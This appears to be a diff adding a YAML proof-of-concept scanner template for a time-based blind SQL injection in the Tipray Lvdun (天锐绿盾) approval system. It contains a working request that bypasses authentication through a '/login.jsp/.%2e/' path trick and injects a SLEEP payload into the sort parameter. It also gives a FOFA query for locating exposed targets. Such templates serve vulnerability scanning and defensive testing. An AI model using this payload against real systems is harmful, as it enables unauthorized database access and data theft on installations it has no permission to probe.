@@ -1,0 +1,21 @@
+id: poc-yaml-tipray-gsas-finduserpageexcludecurrentuser-do-sqli
+info:
+  name: 天锐绿盾审批系统 findUserPageExcludeCurrentUser.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /trwfe/login.jsp/.%2e/user/findUserPageExcludeCurrentUser.do
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: deptId=1&sort=a.ID_%20OR+(SELECT+1337+FROM+(SELECT(SLEEP({{.t1}})))test)
+  expression: status_code == 200 && ( body == "" || ( contains(body,"\"total\":")
+    && contains(body,"\"rows\"") && !contains(body,"<") ) ) && duration >= t1 && duration
+    <= t2
+transport: http
